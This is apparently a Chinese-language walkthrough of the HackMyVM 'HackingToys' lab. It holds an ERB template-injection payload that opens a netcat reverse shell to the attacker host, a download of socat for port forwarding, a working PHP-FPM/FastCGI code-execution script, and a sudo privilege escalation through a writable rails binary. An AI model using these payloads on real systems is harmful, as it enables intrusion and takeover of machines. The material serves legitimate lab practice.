---
title: HMV HackingToys
published: 2025-03-03
pinned: false
description: HMV HackingToys，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-03
pubDate: 2025-03-03
---

## HackingToys

### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=HackingToys

### 日常扫描

```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l        
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.178  08:00:27:23:bb:bb       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
192.168.31.210  f4:6d:3f:27:e6:fb       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded
                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.31.178                                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT
Nmap scan report for 192.168.31.178
Host is up (0.0013s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds

```
有ssl证书，https访问3000端口

### 反弹shell

有个输入框，输入1试试
```
Product does not exist
url
https://192.168.31.178:3000/search?query=1&message=Product+does+not+exist
```

像是ssti

```
https://192.168.31.178:3000/search?query=1&message=%3c%25%3d+7*7+%25%3e
回显49

弹shell
<%= system("nc -e /bin/sh 192.168.31.183 4444"); %>
```

成功啦，但是这个用户没有flag，草了

### 提权

```
lidia@MiWiFi-R4CM-srv:/home$ ss -nltp
ss -nltp                                                                                                                                                    
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                       
LISTEN 0      511        127.0.0.1:80        0.0.0.0:*                                 
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                 
LISTEN 0      1024         0.0.0.0:3000      0.0.0.0:*    users:(("ruby",pid=427,fd=7))
LISTEN 0      4096       127.0.0.1:9000      0.0.0.0:*                                 
LISTEN 0      128             [::]:22           [::]:*     
```

9000和80都不知道在干啥，转发出去，先把socat上传
```
┌──(kali㉿kali)-[/usr/bin]
└─$ python3 -m http.server 8888    
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.31.178 - - [02/Mar/2025 20:49:41] "GET / HTTP/1.1" 200 -
192.168.31.178 - - [02/Mar/2025 20:51:31] "GET /socat HTTP/1.1" 200 -

lidia@MiWiFi-R4CM-srv:/tmp$ wget http://192.168.31.183:8888/socat
wget http://192.168.31.183:8888/socat
--2025-03-02 13:51:31--  http://192.168.31.183:8888/socat
Connecting to 192.168.31.183:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 530680 (518K) [application/octet-stream]
Saving to: ‘socat’

socat               100%[===================>] 518.24K  --.-KB/s    in 0.02s   

2025-03-02 13:51:31 (24.0 MB/s) - ‘socat’ saved [530680/530680]

lidia@MiWiFi-R4CM-srv:/tmp$ ls
ls
index.html
socat
systemd-private-f6d16d6478584049844ac1ca3ccaef9a-apache2.service-Pkk09d
systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-logind.service-ILjViD
systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-timesyncd.service-NsgWNx
lidia@MiWiFi-R4CM-srv:/tmp$ chmod +x socat
chmod +x socat

(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:80&
[1] 1314
(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000&
[2] 1318

```

9000端口这个洞是可以打的，参考https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi
这个端口的信息可以看https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html
```
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/html/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9001 &> $OUTPUT

    cat $OUTPUT
done
```

打一下试试
```
./exp.sh 192.168.31.178
Content-type: text/html; charset=UTF-8

<!--dodi
uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)
-->
..........
```

修改一下弹shell就行了

```
(remote) dodi@hacktoys:/home/dodi$ sudo -l
Matching Defaults entries for dodi on hacktoys:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dodi may run the following commands on hacktoys:
    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh
(remote) dodi@hacktoys:/home/dodi$ cat /usr/local/bin/rvm_rails.sh
#!/bin/bash
export rvm_prefix=/usr/local
export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0
export RUBY_VERSION=ruby-3.1.0
export rvm_version=1.29.12
export rvm_bin_path=/usr/local/rvm/bin
export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0
export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
export rvm_path=/usr/local/rvm
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@"
(remote) dodi@hacktoys:/home/dodi$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails
-rwxrwxr-x 1 root rvm 566 May 20 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
(remote) dodi@hacktoys:/home/dodi$ cat /etc/group | grep rvm
rvm:x:1002:lidia,root

(remote) lidia@hacktoys:/opt/app/gadgets$ echo '/bin/bash' > /usr/local/rvm/gems/ruby-3.1.0/bin/rails


```

执行一下，gameover